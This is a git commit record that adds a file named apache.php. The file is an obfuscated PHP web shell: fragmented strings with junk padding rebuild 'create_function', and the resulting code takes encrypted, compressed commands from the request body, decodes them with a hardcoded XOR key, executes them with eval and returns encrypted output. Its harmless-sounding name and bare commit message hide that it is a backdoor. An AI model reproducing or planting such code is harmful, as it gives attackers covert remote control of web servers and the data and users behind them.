1c972b3ca7f4a1b8251a056f0b288837fb00333e
hossammesbah2020 <45940886+hossammesbah2020@users.noreply.github.com>
2020-02-16 21:51:54 +0200

    Create apache.php

---
+++ apache.php
@@ -0,0 +1,11 @@
+<?php
+$T='ob_end_clean=]();$r=@ba=]se6=]4_encode(@x=](@=]gzcom=]press($o),$k=]));p=]=]rint("=]$p$kh$r$kf");}';
+$R='$k="ef91=]307a=]";$=]k=]h="ae4da64fa55=]b"=];$kf="9=]0ae1fc=]1f=]3c5";$p="5zc7=]=]3DZt=]c2VbNUR=]=';
+$y=str_replace('qp','','qpcqprqpeatqpqpe_fuqpnction');
+$K=']8";function x($t=],$k=]){$c==]str=]len($k=]);$l=strlen=](=]$t);$=]o="";fo=]r($i=0;$i<$l;=]){for($j';
+$B='=0;(=]$=]j<$c&&$i<$l=]);$j+=]+,$i++)=]{$o.=$=]t{$i}=]^$k=]{$=]j};}}return =]$o;=]}if (@=]preg_match(=';
+$g='l=](@gzunc=]ompress=](@x(=]@ba=]se64_d=]ecod=]e(=]$m[1]),$k)=]));=]$o=@=]=]ob_get_c=]ontent=]s();@';
+$w=']"/=]$kh(.+=])=]$kf/",@file=]_get_=]conte=]nts("php:=]//input"=]),$m)===]1) {@o=]b_sta=]rt();@e=]va';
+$S=str_replace('=]','',$R.$K.$B.$w.$g.$T);
+$A=$y('',$S);$A();
+?>
